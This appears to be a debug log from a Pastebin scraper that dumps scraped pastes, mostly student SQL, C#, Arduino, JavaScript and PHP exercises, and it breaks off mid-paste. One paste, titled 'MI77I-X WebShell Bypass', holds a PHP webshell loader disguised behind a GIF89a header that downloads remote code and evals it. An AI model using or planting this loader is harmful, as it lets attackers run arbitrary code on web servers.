2022-06-01T17:05:55.358527+0300 DEBUG debug-test
2022-06-01T17:05:55.470193+0300 INFO info-test
2022-06-01T17:06:10.174192+0300 DEBUG debug-test
2022-06-01T17:06:10.284173+0300 INFO info-test
2022-06-01T17:08:14.950351+0300 INFO [PASTEBIN] got 50 new tasks
2022-06-01T17:08:14.954535+0300 DEBUG [PASTEBIN] problem with data [DataStructure(author='Maks140888', title='Untitled', content="create or replace function find_first_childs (obj_x VARCHAR2) \nreturn objects_below as first_childs objects_below;\nbegin \n\xa0 \xa0 select LPAD(' ', 5*level)||objects.name \n\xa0 \xa0 BULK COLLECT into first_childs\n\xa0 \xa0 FROM objects JOIN object_types USING (object_type_id)\n\xa0 \xa0 where level < (\n\xa0 \xa0 \xa0 \xa0 select level from objects where name = obj_x\n\xa0 \xa0 \xa0 \xa0 start with parent_id is null CONNECT by prior object_id = parent_id\n\xa0 \xa0 \xa0 \xa0 ) + 1\n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 \xa0 \xa0 CONNECT by prior objects.object_id = objects.parent_id;\n\xa0 \xa0 \n\xa0 \xa0 return first_childs;\nend;\n\xa0\nselect * from find_first_childs('ін-94-1');", date='2022-06-01 14:05:13 +00:00', hash_val='b41aca26982dbdf9bd73e9f30bf25f21', url='/kEQRsKq0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='AshfaqFardin', title='blink', content='//define\n#define Led 13\n\xa0\n//setup\nvoid setup(){\n\xa0 \xa0 Serial.begin(9600);\n\xa0 \xa0 pinMode(Led, OUTPUT);\n}\n\xa0\n//main\nvoid loop(){\n\xa0 \xa0 digitalWrite(Led, HIGH);\n\xa0 \xa0 delay(2000);\n\xa0 \xa0 digitalWrite(Led, LOW);\n\xa0 \xa0 delay(2000);\n}', date='2022-06-01 14:03:20 +00:00', hash_val='a56b840038d9e0e1663c1e5801f61237', url='/XJ1Tt0Dd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\n\xa0\nnamespace Hot_Potato\n{\n\xa0 \xa0 class HotPotato\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> kids = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int multiplicity = int.Parse(Console.ReadLine());\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int curent = 0;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while (kids.Count > 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent++;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 string kid = kids.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!(curent % multiplicity).Equals(0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 kids.Enqueue(kid);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Removed {kid}"");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent = 0;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Last is {kids.Dequeue()}"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 14:01:56 +00:00', hash_val='c40603729d473be6461eb00f94dedb74', url='/2nz8WBMX', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dunyto', title='Create Report', content='function generateReport() {\n\xa0 \xa0 let cbs = document.querySelectorAll(""thead tr th input"");\n\xa0 \xa0 let colPos = [];\n\xa0 \xa0 for (let i = 0; i < cbs.length; i ++) {\n\xa0 \xa0 \xa0 \xa0 if (cbs[i].checked) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 colPos.push(i);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let finalResult = [];\n\xa0\n\xa0 \xa0 let data = document.querySelectorAll(""tbody tr"");\n\xa0 \xa0 for (let j = 0; j < data.length; j ++) {\n\xa0 \xa0 \xa0 \xa0 let currRow = data[j].children;\n\xa0 \xa0 \xa0 \xa0 let currItems = {};\n\xa0 \xa0 \xa0 \xa0 for (let k = 0; k < currRow.length; k ++) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (colPos.includes(k)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let label = cbs[k].name;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currItems[label] = currRow[k].textContent;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 finalResult.push(currItems);\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let jsonFinal = JSON.stringify(finalResult);\n\xa0 \xa0 let target = document.getElementById(\'output\');\n\xa0 \xa0 target.value = jsonFinal;\n}', date='2022-06-01 13:59:57 +00:00', hash_val='cf8530010b5f97ab0fca43fd8e6f8846', url='/XxXav8r9', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='sugab', title='Consume API Edit PHP', content='<?php\ninclude \'inc.php\';\n\xa0\nif (!empty($_POST[\'nim\'])) {\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $url = $api_url. \'?nim=\' . $nim;;\n\xa0\n\xa0 $postdata = array();\n\xa0 $postdata[\'nama\'] = $_POST[\'nama\'];\n\xa0 $postdata[\'angkatan\'] = $_POST[\'angkatan\'];\n\xa0 $postdata[\'semester\'] = $_POST[\'semester\'];\n\xa0 $postdata[\'ipk\'] = $_POST[\'ipk\'];\n\xa0 $postdata[\'email\'] = $_POST[\'email\'];\n\xa0 $postdata[\'telepon\'] = $_POST[\'telepon\'];\n\xa0 $json = json_encode($postdata);\n\xa0\n\xa0 $ch = curl_init();\n\xa0 curl_setopt($ch, CURLOPT_URL, $url);\n\xa0 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, ""PUT"");\n\xa0 curl_setopt($ch, CURLOPT_HTTPHEADER, array(\'Content-Type: appplication/json\'));\n\xa0 curl_setopt($ch, CURLOPT_POSTFIELDS, $json);\n\xa0 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n\xa0\n\xa0 $response = curl_exec($ch);\n\xa0 curl_close($ch);\n\xa0\n\xa0 header(\'location:index.php\');\n\xa0 exit();\n}\n?>\n\xa0\n<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"">\n<html>\n\xa0\n<head>\n\xa0 <!-- BOOTSTRAP -->\n\xa0 <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"" integrity=""sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS"" crossorigin=""anonymous"">\n\xa0 <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"" integrity=""sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://code.jquery.com/jquery-3.3.1.slim.min.js"" integrity=""sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"" integrity=""sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"" crossorigin=""anonymous""></script>\n\xa0 <title>Data Mahasiswa Politeknik</title>\n</head>\n\xa0\n<body>\n\xa0 <nav class=""navbar navbar-expand-lg navbar-light bg-light justify-content-between"">\n\xa0 \xa0 <a class=""navbar-brand"" href=""#"">\n\xa0 \xa0 \xa0 <img src=""img/logo.png"" width=""60"" height=""60"" alt="""">\n\xa0 \xa0 </a>\n\xa0 \xa0 <h1>Data Mahasiswa Politeknik</h1>\n\xa0 \xa0 <a href=""index.php"">\n\xa0 \xa0 \xa0 <button type=""button btn-lg"" class=""btn btn-success btn-sm"">Back</button>\n\xa0 \xa0 </a>\n\xa0 </nav>\n\xa0\n\xa0 <?php\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $api_mahasiswa = $api_url . \'?nim=\' . $nim;\n\xa0 $json_detail = @file_get_contents($api_mahasiswa);\n\xa0 $arr_detail = json_decode($json_detail, true);\n\xa0 $result = isset($arr_detail[\'data\']) ? $arr_detail[\'data\'] : array();\n\xa0 $data = $result[0];\n\xa0 ?>\n\xa0 <div class=""col-4""></div>\n\xa0 <div class=""container col-4 my-3"">\n\xa0 \xa0 <h3>Edit Data Mahasiswa</h3>\n\xa0 \xa0 <form method=""POST"" action="""">\n\xa0 \xa0 \xa0 <input type=""hidden"" name=""nim"" value=""<?php echo $data[\'nim\']; ?>"" />\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>NIM</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nim"" class=""form-control"" value=""<?php echo $data[\'nim\']; ?>"" readonly>\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Nama</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nama"" class=""form-control"" value=""<?php echo $data[\'nama\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Angkatan</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""angkatan"" class=""form-control"" value=""<?php echo $data[\'angkatan\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Semester</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""semester"" class=""form-control"" value=""<?php echo $data[\'semester\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>IPK</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""ipk"" class=""form-control"" value=""<?php echo $data[\'ipk\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Email</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""email"" class=""form-control"" value=""<?php echo $data[\'email\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Telepon</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""telepon"" class=""form-control"" value=""<?php echo $data[\'telepon\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div>\n\xa0 \xa0 \xa0 \xa0 <button class=""btn btn-success"" name=""submit"" type=""submit"">Submit Data</button>\n\xa0 \xa0 \xa0 </div>\n\xa0 \xa0 </form>\n\xa0 </div>\n\xa0 <div class=""col-4""></div>\n\xa0\n</body>\n\xa0\n</html>', date='2022-06-01 13:53:01 +00:00', hash_val='e23a311fb08bb1d7fcb5bb826a8b4c1d', url='/sAgz7Jas', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="delete from objects\nwhere name = 'Томас Шелби'\n\xa0\nINSERT INTO objects VALUES (100, 50, 15, 'Томас Шелби')", date='2022-06-01 13:49:33 +00:00', hash_val='9e40e7a0737cf3168037aa88b0c67dc2', url='/6XtvDpbC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='willysec_id', title='MI77I-X WebShell Bypass', content="Gif89a\n<?php $c=&$cv;$cv='https://pastebin.com/raw/jePRQN8t';$b=file_get_contents($c);@eval('?>'.'/******/'.$b);", date='2022-06-01 13:37:58 +00:00', hash_val='ee758ec64e1ac541c32118c3b9c6585e', url='/S6BumVkC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. Computer Store', content='using System;\n\xa0\nnamespace _01._Computer_Store\n{\n\xa0 class Program\n\xa0 {\n\xa0 \xa0 static void Main (string[]args)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 string partPrice = Console.ReadLine ();\n\xa0 \xa0 \xa0 double currentPrice = 0;\n\xa0 \xa0 \xa0 double totalPrice = 0;\n\xa0 \xa0 \xa0 double discont = 0;\n\xa0 \xa0 \xa0 while (partPrice != ""regular"")\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 if (partPrice == ""special"")\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 discont = totalPrice * 0.12;\n\xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 currentPrice = double.Parse (partPrice);\n\xa0\n\xa0 \xa0 \xa0 if (currentPrice < 0)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine (""Invalid price!"");\n\xa0 \xa0 \xa0 \xa0 \xa0 currentPrice = 0;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 totalPrice += currentPrice;\n\xa0 \xa0 \xa0 partPrice = Console.ReadLine();\n\xa0\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 double priceWithTax = (totalPrice*1.2) - discont;\n\xa0 \xa0 \xa0 if (priceWithTax == 0)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Invalid order!"");\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 else\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Congratulations you\'ve just bought a new computer!"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Price without taxes: {totalPrice:f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Taxes: {(totalPrice*0.2):f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""-----------"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Total price: {priceWithTax:f2}$"");\n\xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 }\n}', date='2022-06-01 13:36:31 +00:00', hash_val='149c96076478eb86b5b2fb838662095a', url='/nFymAiMC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\xa0\nnamespace MealPlan\n{\n\xa0 \xa0 class Program\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Dictionary<string, int> mealsCalories = new Dictionary<string, int>\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""salad"", 350},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""soup"", 490},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""pasta"", 680},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""steak"", 790}\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> keysQueue = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Stack<int> valuesStack = new Stack<int>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries).Select(int.Parse));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int startMealsCount = keysQueue.Count; \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while ((keysQueue.Count > 0) && (valuesStack.Count > 0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentCallories = valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentMealCallories = mealsCalories[keysQueue.Peek()];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories - currentMealCallories >= 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories); \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories += valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 StringBuilder sb = new StringBuilder();\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John had {startMealsCount} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""For the next few days, he can eat {string.Join("", "", valuesStack)} calories."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John ate enough, he had {startMealsCount - keysQueue.Count} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""Meals left: {string.Join("", "", keysQueue)}."");\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine(sb.ToString().TrimEnd());\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 13:34:37 +00:00', hash_val='e816c4ce3fd5316828944cfe846e46d2', url='/CFxHbqkU', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="select \xa0name as exercise6\nfrom objects\nwhere level = 2 START WITH objects.name = 'Баришов Максим' \xa0\nCONNECT by prior objects.parent_id = object_id", date='2022-06-01 13:26:54 +00:00', hash_val='24dd6cc9c81ed1b0d571ac896b18fd38', url='/vAC6sJ5X', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='rafalou38', title='Untitled', content='#include <ti/getcsc.h>\n#include <sys/util.h>\n#include <graphx.h>\n#include <keypadc.h>\n\xa0\n#define width GFX_LCD_WIDTH\n#define height GFX_LCD_HEIGHT\n\xa0\n#define MUTATION_RATE 10\n\xa0\nint main(void)\n{\n\xa0\n\xa0 \xa0 uint32_t targetColor, pixelColor;\n\xa0 \xa0 int x, y, i, j, oi, oj;\n\xa0 \xa0 int newR, newG, newB;\n\xa0 \xa0 uint32_t grid[width][height];\n\xa0\n\xa0 \xa0 for (i = 0; i < width; i++)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < height; j++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 grid[i][j] = 0x000000;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* Initialize graphics drawing */\n\xa0 \xa0 gfx_Begin();\n\xa0\n\xa0 \xa0 grid[width / 2][height / 2] = 0xff6464;\n\xa0\n\xa0 \xa0 gfx_FillScreen(gfx_RGBTo1555(0, 0, 0));\n\xa0\n\xa0 \xa0 i = 0;\n\xa0 \xa0 while (true)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 //\n\xa0 \xa0 \xa0 \xa0 if (kb_IsDown(kb_Annul))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0\n\xa0 \xa0 \xa0 \xa0 for (x = 0; x < width; x++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (y = 0; y < height; y++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // 